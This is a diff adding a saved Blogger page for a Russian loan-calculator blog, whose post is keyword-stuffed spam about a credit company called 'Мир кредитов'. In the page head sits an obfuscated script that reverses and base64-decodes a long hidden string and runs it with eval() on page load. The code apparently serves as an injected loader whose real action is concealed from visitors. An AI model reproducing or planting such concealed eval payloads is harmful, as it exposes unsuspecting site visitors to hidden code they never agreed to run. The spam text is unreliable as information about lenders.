@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html class='v2' dir='ltr' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+<link href='https://www.blogger.com/static/v1/widgets/3822632116-css_bundle_v2.css' rel='stylesheet' type='text/css'/>
+<script src='http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js' type='text/javascript'></script><script language='javascript' type='text/javascript'>var _011='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';function _111(data){var O0llOI="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";var o1,o2,o3,h1,h2,h3,h4,bits,i=0,enc='';do{h1=O0llOI.indexOf(data.charAt(i++));h2=O0llOI.indexOf(data.charAt(i++));h3=O0llOI.indexOf(data.charAt(i++));h4=O0llOI.indexOf(data.charAt(i++));bits=h1<<18|h2<<12|h3<<6|h4;o1=bits>>16&0xff;o2=bits>>8&0xff;o3=bits&0xff;if(h3==64){enc+=String.fromCharCode(o1)}else if(h4==64){enc+=String.fromCharCode(o1,o2)}else{enc+=String.fromCharCode(o1,o2,o3)}}while(i<data.length);return enc} function O0l(string){ var ret = '', i = 0;for ( i = string.length-1; i >= 0; i-- ){ ret += string.charAt(i);} return ret; }eval(_111(O0l(_011)));</script>
+<meta content='width=1100' name='viewport'/>
+<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
+<meta content='blogger' name='generator'/>
+<link href='http://lasiperear.blogspot.com/favicon.ico' rel='icon' type='image/x-icon'/>
+<link href='http://lasiperear.blogspot.com/2014/03/blog-post_9772.html' rel='canonical'/>
+<link rel="alternate" type="application/atom+xml" title="Кредитный калькулятор - Atom" href="http://lasiperear.blogspot.com/feeds/posts/default" />
+<link rel="alternate" type="application/rss+xml" title="Кредитный калькулятор - RSS" href="http://lasiperear.blogspot.com/feeds/posts/default?alt=rss" />
+<link rel="service.post" type="application/atom+xml" title="Кредитный калькулятор - Atom" href="https://www.blogger.com/feeds/2135239325400794714/posts/default" />
+
+<link rel="alternate" type="application/atom+xml" title="Кредитный калькулятор - Atom" href="http://lasiperear.blogspot.com/feeds/7552603447337825286/comments/default" />
+<!--[if IE]><script type="text/javascript" src="https://www.blogger.com/static/v1/jsbin/403901366-ieretrofit.js"></script>
+<![endif]-->
+<link href='http://farm3.staticflickr.com/2855/13384484993_9b44361d76_m.jpg' rel='image_src'/>
+<meta content='http://lasiperear.blogspot.com/2014/03/blog-post_9772.html' property='og:url'/>
+<meta content='Компания мир кредитов' property='og:title'/>
+<meta content='О компании - мир кредита - о компании мир кредита – молодая энергично развивающаяся компания профессионалов, кредит в юникредит банке получи...' property='og:description'/>
+<meta content='https://lh5.googleusercontent.com/proxy/F8w-zArddG3OR_gqQV23G_W0SvZVm5qeunJqcmjeTUp01_4ROpR5JwrgGaVRZJzQvuKT7ng9eD6J6q3EdDGK2dnp0ZZ4RmSHkcKcFxC-v5uSnVY=w1200-h630-p-k-no-nu' property='og:image'/>
+<!--[if IE]> <script> (function() { var html5 = ("abbr,article,aside,audio,canvas,datalist,details," + "figure,footer,header,hgroup,mark,menu,meter,nav,output," + "progress,section,time,video").split(','); for (var i = 0; i < html5.length; i++) { document.createElement(html5[i]); } try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {} })(); </script> <![endif]-->
+<title>Кредитный калькулятор: Компания мир кредитов</title>
+<style id='page-skin-1' type='text/css'><!--
+/*
+-----------------------------------------------
+Blogger Template Style
+Name:     Simple
+Designer: Blogger
+URL:      www.blogger.com
+----------------------------------------------- */
+/* Content
+----------------------------------------------- */
+body {
+font: normal normal 12px 'Trebuchet MS', Trebuchet, Verdana, sans-serif;
+color: #666666;
+background: #ffffff none repeat scroll top left;
+padding: 0 0 0 0;
+}
+html body .region-inner {
+min-width: 0;
+max-width: 100%;
+width: auto;
+}
+h2 {
+font-size: 22px;
+}
+a:link {
+text-decoration:none;
+color: #2288bb;
+}
+a:visited {
+text-decoration:none;
+color: #888888;
+}
+a:hover {
+text-decoration:underline;
+color: #33aaff;
+}
+.body-fauxcolumn-outer .fauxcolumn-inner {
+background: transparent none repeat scroll top left;
+_background-image: none;
+}
+.body-fauxcolumn-outer .cap-top {
+position: absolute;
+z-index: 1;
+height: 400px;
+width: 100%;
+}
+.body-fauxcolumn-outer .cap-top .cap-left {
+width: 100%;
+background: transparent none repeat-x scroll top left;
+_background-image: none;
+}
+.content-outer {
+-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
+-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
+-goog-ms-box-shadow: 0 0 0 #333333;
+box-shadow: 0 0 0 rgba(0, 0, 0, .15);
+margin-bottom: 1px;
+}
+.content-inner {
+padding: 10px 40px;
+}
+.content-inner {
+background-color: #ffffff;
+}
+/* Header
+----------------------------------------------- */
+.header-outer {
+background: transparent none repeat-x scroll 0 -400px;
+_background-image: none;
+}
+.Header h1 {
+font: normal normal 40px 'Trebuchet MS',Trebuchet,Verdana,sans-serif;
+color: #000000;
+text-shadow: 0 0 0 rgba(0, 0, 0, .2);
+}
+.Header h1 a {
+color: #000000;
+}
+.Header .description {
+font-size: 18px;
+color: #000000;
+}
+.header-inner .Header .titlewrapper {
+padding: 22px 0;
+}
+.header-inner .Header .descriptionwrapper {
+padding: 0 0;
+}
+/* Tabs
+----------------------------------------------- */
+.tabs-inner .section:first-child {
+border-top: 0 solid #dddddd;
+}
+.tabs-inner .section:first-child ul {
+margin-top: -1px;
+border-top: 1px solid #dddddd;
+border-left: 1px solid #dddddd;
+border-right: 1px solid #dddddd;
+}
+.tabs-inner .widget ul {
+background: transparent none repeat-x scroll 0 -800px;
+_background-image: none;
+border-bottom: 1px solid #dddddd;
+margin-top: 0;
+margin-left: -30px;
+margin-right: -30px;
+}
+.tabs-inner .widget li a {
+display: inline-block;
+padding: .6em 1em;
+font: normal normal 12px 'Trebuchet MS', Trebuchet, Verdana, sans-serif;
+color: #000000;
+border-left: 1px solid #ffffff;
+border-right: 1px solid #dddddd;
+}
+.tabs-inner .widget li:first-child a {
+border-left: none;
+}
+.tabs-inner .widget li.selected a, .tabs-inner .widget li a:hover {
+color: #000000;
+background-color: #eeeeee;
+text-decoration: none;
+}
+/* Columns
+----------------------------------------------- */
+.main-outer {
+border-top: 0 solid transparent;
+}
+.fauxcolumn-left-outer .fauxcolumn-inner {
+border-right: 1px solid transparent;
+}
+.fauxcolumn-right-outer .fauxcolumn-inner {
+border-left: 1px solid transparent;
+}
+/* Headings
+----------------------------------------------- */
+div.widget > h2,
+div.widget h2.title {
+margin: 0 0 1em 0;
+font: normal bold 11px 'Trebuchet MS',Trebuchet,Verdana,sans-serif;
+color: #000000;
+}
+/* Widgets
+----------------------------------------------- */
+.widget .zippy {
+color: #999999;
+text-shadow: 2px 2px 1px rgba(0, 0, 0, .1);
+}
+.widget .popular-posts ul {
+list-style: none;
+}
+/* Posts
+----------------------------------------------- */
+h2.date-header {
+font: normal bold 11px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+}
+.date-header span {
+background-color: #bbbbbb;
+color: #ffffff;
+padding: 0.4em;
+letter-spacing: 3px;
+margin: inherit;
+}
+.main-inner {
+padding-top: 35px;
+padding-bottom: 65px;
+}
+.main-inner .column-center-inner {
+padding: 0 0;
+}
+.main-inner .column-center-inner .section {
+margin: 0 1em;
+}
+.post {
+margin: 0 0 45px 0;
+}
+h3.post-title, .comments h4 {
+font: normal normal 22px 'Trebuchet MS',Trebuchet,Verdana,sans-serif;
+margin: .75em 0 0;
+}
+.post-body {
+font-size: 110%;
+line-height: 1.4;
+position: relative;
+}
+.post-body img, .post-body .tr-caption-container, .Profile img, .Image img,
+.BlogList .item-thumbnail img {
+padding: 2px;
+background: #ffffff;
+border: 1px solid #eeeeee;
+-moz-box-shadow: 1px 1px 5px rgba(0, 0, 0, .1);
+-webkit-box-shadow: 1px 1px 5px rgba(0, 0, 0, .1);
+box-shadow: 1px 1px 5px rgba(0, 0, 0, .1);
+}
+.post-body img, .post-body .tr-caption-container {
+padding: 5px;
+}
+.post-body .tr-caption-container {
+color: #666666;
+}
+.post-body .tr-caption-container img {
+padding: 0;
+background: transparent;
+border: none;
+-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .1);
+-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .1);
+box-shadow: 0 0 0 rgba(0, 0, 0, .1);
+}
+.post-header {
+margin: 0 0 1.5em;
+line-height: 1.6;
+font-size: 90%;
+}
+.post-footer {
+margin: 20px -2px 0;
+padding: 5px 10px;
+color: #666666;
+background-color: #eeeeee;
+border-bottom: 1px solid #eeeeee;
+line-height: 1.6;
+font-size: 90%;
+}
+#comments .comment-author {
+padding-top: 1.5em;
+border-top: 1px solid transparent;
+background-position: 0 1.5em;
+}
+#comments .comment-author:first-child {
+padding-top: 0;
+border-top: none;
+}
+.avatar-image-container {
+margin: .2em 0 0;
+}
+#comments .avatar-image-container img {
+border: 1px solid #eeeeee;
+}
+/* Comments
+----------------------------------------------- */
+.comments .comments-content .icon.blog-author {
+background-repeat: no-repeat;
+background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEgAACxIB0t1+/AAAAAd0SU1FB9sLFwMeCjjhcOMAAAD+SURBVDjLtZSvTgNBEIe/WRRnm3U8RC1neQdsm1zSBIU9VVF1FkUguQQsD9ITmD7ECZIJSE4OZo9stoVjC/zc7ky+zH9hXwVwDpTAWWLrgS3QAe8AZgaAJI5zYAmc8r0G4AHYHQKVwII8PZrZFsBFkeRCABYiMh9BRUhnSkPTNCtVXYXURi1FpBDgArj8QU1eVXUzfnjv7yP7kwu1mYrkWlU33vs1QNu2qU8pwN0UpKoqokjWwCztrMuBhEhmh8bD5UDqur75asbcX0BGUB9/HAMB+r32hznJgXy2v0sGLBcyAJ1EK3LFcbo1s91JeLwAbwGYu7TP/3ZGfnXYPgAVNngtqatUNgAAAABJRU5ErkJggg==);
+}
+.comments .comments-content .loadmore a {
+border-top: 1px solid #999999;
+border-bottom: 1px solid #999999;
+}
+.comments .comment-thread.inline-thread {
+background-color: #eeeeee;
+}
+.comments .continue {
+border-top: 2px solid #999999;
+}
+/* Accents
+---------------------------------------------- */
+.section-columns td.columns-cell {
+border-left: 1px solid transparent;
+}
+.blog-pager {
+background: transparent url(//www.blogblog.com/1kt/simple/paging_dot.png) repeat-x scroll top center;
+}
+.blog-pager-older-link, .home-link,
+.blog-pager-newer-link {
+background-color: #ffffff;
+padding: 5px;
+}
+.footer-outer {
+border-top: 1px dashed #bbbbbb;
+}
+/* Mobile
+----------------------------------------------- */
+body.mobile  {
+background-size: auto;
+}
+.mobile .body-fauxcolumn-outer {
+background: transparent none repeat scroll top left;
+}
+.mobile .body-fauxcolumn-outer .cap-top {
+background-size: 100% auto;
+}
+.mobile .content-outer {
+-webkit-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
+box-shadow: 0 0 3px rgba(0, 0, 0, .15);
+}
+.mobile .tabs-inner .widget ul {
+margin-left: 0;
+margin-right: 0;
+}
+.mobile .post {
+margin: 0;
+}
+.mobile .main-inner .column-center-inner .section {
+margin: 0;
+}
+.mobile .date-header span {
+padding: 0.1em 10px;
+margin: 0 -10px;
+}
+.mobile h3.post-title {
+margin: 0;
+}
+.mobile .blog-pager {
+background: transparent none no-repeat scroll top center;
+}
+.mobile .footer-outer {
+border-top: none;
+}
+.mobile .main-inner, .mobile .footer-inner {
+background-color: #ffffff;
+}
+.mobile-index-contents {
+color: #666666;
+}
+.mobile-link-button {
+background-color: #2288bb;
+}
+.mobile-link-button a:link, .mobile-link-button a:visited {
+color: #ffffff;
+}
+.mobile .tabs-inner .section:first-child {
+border-top: none;
+}
+.mobile .tabs-inner .PageList .widget-content {
+background-color: #eeeeee;
+color: #000000;
+border-top: 1px solid #dddddd;
+border-bottom: 1px solid #dddddd;
+}
+.mobile .tabs-inner .PageList .widget-content .pagelist-arrow {
+border-left: 1px solid #dddddd;
+}
+
+--></style>
+<style id='template-skin-1' type='text/css'><!--
+body {
+min-width: 960px;
+}
+.content-outer, .content-fauxcolumn-outer, .region-inner {
+min-width: 960px;
+max-width: 960px;
+_width: 960px;
+}
+.main-inner .columns {
+padding-left: 0px;
+padding-right: 310px;
+}
+.main-inner .fauxcolumn-center-outer {
+left: 0px;
+right: 310px;
+/* IE6 does not respect left and right together */
+_width: expression(this.parentNode.offsetWidth -
+parseInt("0px") -
+parseInt("310px") + 'px');
+}
+.main-inner .fauxcolumn-left-outer {
+width: 0px;
+}
+.main-inner .fauxcolumn-right-outer {
+width: 310px;
+}
+.main-inner .column-left-outer {
+width: 0px;
+right: 100%;
+margin-left: -0px;
+}
+.main-inner .column-right-outer {
+width: 310px;
+margin-right: -310px;
+}
+#layout {
+min-width: 0;
+}
+#layout .content-outer {
+min-width: 0;
+width: 800px;
+}
+#layout .region-inner {
+min-width: 0;
+width: auto;
+}
+--></style>
+<link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=2135239325400794714&amp;zx=4c55cf30-1ec0-49f2-863c-4fe3eaa55b51' media='none' onload='if(media!=&#39;all&#39;)media=&#39;all&#39;' rel='stylesheet'/><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=2135239325400794714&amp;zx=4c55cf30-1ec0-49f2-863c-4fe3eaa55b51' rel='stylesheet'/></noscript>
+
+</head>
+<body class='loading variant-simplysimple'>
+<div id='result'></div>
+<div class='navbar section' id='navbar'><div class='widget Navbar' data-version='1' id='Navbar1'><script type="text/javascript">
+    function setAttributeOnload(object, attribute, val) {
+      if(window.addEventListener) {
+        window.addEventListener('load',
+          function(){ object[attribute] = val; }, false);
+      } else {
+        window.attachEvent('onload', function(){ object[attribute] = val; });
+      }
+    }
+  </script>
+<div id="navbar-iframe-container"></div>
+<script type="text/javascript" src="https://apis.google.com/js/plusone.js"></script>
+<script type="text/javascript">
+      gapi.load("gapi.iframes:gapi.iframes.style.bubble", function() {
+        if (gapi.iframes && gapi.iframes.getContext) {
+          gapi.iframes.getContext().openChild({
+              url: 'https://www.blogger.com/navbar.g?targetBlogID\x3d2135239325400794714\x26blogName\x3d%D0%9A%D1%80%D0%B5%D0%B4%D0%B8%D1%82%D0%BD%D1%8B%D0%B9+%D0%BA%D0%B0%D0%BB%D1%8C%D0%BA%D1%83%D0%BB%D1%8F%D1%82%D0%BE%D1%80\x26publishMode\x3dPUBLISH_MODE_BLOGSPOT\x26navbarType\x3dLIGHT\x26layoutType\x3dLAYOUTS\x26searchRoot\x3dhttps://lasiperear.blogspot.com/search\x26blogLocale\x3dru\x26v\x3d2\x26homepageUrl\x3dhttp://lasiperear.blogspot.com/\x26targetPostID\x3d7552603447337825286\x26blogPostOrPageUrl\x3dhttp://lasiperear.blogspot.com/2014/03/blog-post_9772.html\x26vt\x3d-6848423422347801765',
+              where: document.getElementById("navbar-iframe-container"),
+              id: "navbar-iframe"
+          });
+        }
+      });
+    </script><script type="text/javascript">
+(function() {
+var script = document.createElement('script');
+script.type = 'text/javascript';
+script.src = '//pagead2.googlesyndication.com/pagead/js/google_top_exp.js';
+var head = document.getElementsByTagName('head')[0];
+if (head) {
+head.appendChild(script);
+}})();
+</script>
+</div></div>
+<div class='body-fauxcolumns'>
+<div class='fauxcolumn-outer body-fauxcolumn-outer'>
+<div class='cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left'>
+<div class='fauxborder-right'></div>
+<div class='fauxcolumn-inner'>
+</div>
+</div>
+<div class='cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+</div>
+<div class='content'>
+<div class='content-fauxcolumns'>
+<div class='fauxcolumn-outer content-fauxcolumn-outer'>
+<div class='cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left'>
+<div class='fauxborder-right'></div>
+<div class='fauxcolumn-inner'>
+</div>
+</div>
+<div class='cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+</div>
+<div class='content-outer'>
+<div class='content-cap-top cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left content-fauxborder-left'>
+<div class='fauxborder-right content-fauxborder-right'></div>
+<div class='content-inner'>
+<header>
+<div class='header-outer'>
+<div class='header-cap-top cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left header-fauxborder-left'>
+<div class='fauxborder-right header-fauxborder-right'></div>
+<div class='region-inner header-inner'>
+<div class='header section' id='header'><div class='widget Header' data-version='1' id='Header1'>
+<div id='header-inner'>
+<div class='titlewrapper'>
+<h1 class='title'>
+<a href='http://lasiperear.blogspot.com/'>
+Кредитный калькулятор
+</a>
+</h1>
+</div>
+<div class='descriptionwrapper'>
+<p class='description'><span>
+</span></p>
+</div>
+</div>
+</div></div>
+</div>
+</div>
+<div class='header-cap-bottom cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+</header>
+<div class='tabs-outer'>
+<div class='tabs-cap-top cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left tabs-fauxborder-left'>
+<div class='fauxborder-right tabs-fauxborder-right'></div>
+<div class='region-inner tabs-inner'>
+<div class='tabs no-items section' id='crosscol'></div>
+<div class='tabs no-items section' id='crosscol-overflow'></div>
+</div>
+</div>
+<div class='tabs-cap-bottom cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+<div class='main-outer'>
+<div class='main-cap-top cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left main-fauxborder-left'>
+<div class='fauxborder-right main-fauxborder-right'></div>
+<div class='region-inner main-inner'>
+<div class='columns fauxcolumns'>
+<div class='fauxcolumn-outer fauxcolumn-center-outer'>
+<div class='cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left'>
+<div class='fauxborder-right'></div>
+<div class='fauxcolumn-inner'>
+</div>
+</div>
+<div class='cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+<div class='fauxcolumn-outer fauxcolumn-left-outer'>
+<div class='cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left'>
+<div class='fauxborder-right'></div>
+<div class='fauxcolumn-inner'>
+</div>
+</div>
+<div class='cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+<div class='fauxcolumn-outer fauxcolumn-right-outer'>
+<div class='cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left'>
+<div class='fauxborder-right'></div>
+<div class='fauxcolumn-inner'>
+</div>
+</div>
+<div class='cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+<!-- corrects IE6 width calculation -->
+<div class='columns-inner'>
+<div class='column-center-outer'>
+<div class='column-center-inner'>
+<div class='main section' id='main'><div class='widget Blog' data-version='1' id='Blog1'>
+<div class='blog-posts hfeed'>
+
+          <div class="date-outer">
+        
+<h2 class='date-header'><span>вторник, 25 марта 2014 г.</span></h2>
+
+          <div class="date-posts">
+        
+<div class='post-outer'>
+<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
+<meta content='http://farm3.staticflickr.com/2855/13384484993_9b44361d76_m.jpg' itemprop='image_url'/>
+<meta content='2135239325400794714' itemprop='blogId'/>
+<meta content='7552603447337825286' itemprop='postId'/>
+<a name='7552603447337825286'></a>
+<h3 class='post-title entry-title' itemprop='name'>
+Компания мир кредитов
+</h3>
+<div class='post-header'>
+<div class='post-header-line-1'></div>
+</div>
+<div class='post-body entry-content' id='post-body-7552603447337825286' itemprop='description articleBody'>
+<div dir="ltr" style="text-align: left;" trbidi="on"><div style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img height="240" src="http://farm3.staticflickr.com/2855/13384484993_9b44361d76_m.jpg" width="240" /></div><p>О компании - мир кредита - о компании мир кредита &#8211; молодая энергично развивающаяся компания профессионалов, кредит в юникредит банке получи деньги в долг! Нужен только паспорт! компания мир кредитов - помощь. Мир, управляющая компания, ооо веб-сайтэкспресс-кредит в день обращения! Кредит наличными 12. 9% годовых за 90 минут! 1 заявка на автокредит в 9 банков! Компания мир кредита, ооо, бюро - мир кредита. Информация о брокере: кредиты, ипотека, отзывы, - компания мир кредита г. Заявка на кредит. Онлайн форма отправьте заявку на получение кредита в юникредит банке. Взять кредит на кредит.</p><br /><p>За 15 мин с хорошей кредитной историей - кредит под 14%. Оформите заявку онлайн! заявка на кредит без отказов информация о ооо мир кредитов - контакты, реквизиты, виды деятельности. Компания - ооо мир кредитов, г. Маршрутыбыстрые займы на vivus. Быстрые деньги за 1 день! Низкая процентная ставка! Узнай сколько могут дать в кредит взять кредит на кредит. Кредит в петербурге от 17%! Заполните заявку - получите, пожалуй, лучшие предложения! компания мир кредитов - москва. Срочно понадобились деньги, но банк, не объясняя причин, отказывает вам. Оформи заявку на кредит от 50 000 р.</p><br /><p>От 16, 5% одобрение за 24 часа. Партнерам | мир кредита партнерам, нужен автокредит? Заявка на кредит в 10 банков за минуту. Одобрение за час. Открой для себя мир! Кредитный брокер &#8211; срочная помощь в оформлении и получении кредита в москве. Кредит в ситибанке - 14% годовых! Компания мир кредита, ооо, бюро кредитных решений в справочнике gmstar. Ru &#8211; контакты фирмы, мир кредита - ипотека. +7 (495) 921-31-19 3 архангельский переул&#8230;кредитный брокер | помощь - информация по мир кредитов, - компания расположена по адресу 191036, г. Санкт-петербург, - мир кредитов, ооо // санкт - компания мир кредитов (москва) &#8211; самая свежая информация (положительные и негативные - мир кредита - деньги под залог.</p></div>
+<div style='clear: both;'></div>
+</div>
+<div class='post-footer'>
+<div class='post-footer-line post-footer-line-1'>
+<span class='post-author vcard'>
+Автор:
+<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
+<meta content='https://www.blogger.com/profile/00934092951384776586' itemprop='url'/>
+<a class='g-profile' href='https://www.blogger.com/profile/00934092951384776586' rel='author' title='author profile'>
+<span itemprop='name'>Рома</span>
+</a>
+</span>
+</span>
+<span class='post-timestamp'>
+на
+<meta content='http://lasiperear.blogspot.com/2014/03/blog-post_9772.html' itemprop='url'/>
+<a class='timestamp-link' href='http://lasiperear.blogspot.com/2014/03/blog-post_9772.html' rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2014-03-25T21:19:00-07:00'>21:19</abbr></a>
+</span>
+<span class='post-comment-link'>
+</span>
+<span class='post-icons'>
+<span class='item-control blog-admin pid-573951062'>
+<a href='https://www.blogger.com/post-edit.g?blogID=2135239325400794714&postID=7552603447337825286&from=pencil' title='Изменить сообщение'>
+<img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
+</a>
+</span>
+</span>
+<div class='post-share-buttons goog-inline-block'>
+<a class='goog-inline-block share-button sb-email' href='https://www.blogger.com/share-post.g?blogID=2135239325400794714&postID=7552603447337825286&target=email' target='_blank' title='Отправить по электронной почте'><span class='share-button-link-text'>Отправить по электронной почте</span></a><a class='goog-inline-block share-button sb-blog' href='https://www.blogger.com/share-post.g?blogID=2135239325400794714&postID=7552603447337825286&target=blog' onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target='_blank' title='Написать об этом в блоге'><span class='share-button-link-text'>Написать об этом в блоге</span></a><a class='goog-inline-block share-button sb-twitter' href='https://www.blogger.com/share-post.g?blogID=2135239325400794714&postID=7552603447337825286&target=twitter' target='_blank' title='Опубликовать в Twitter'><span 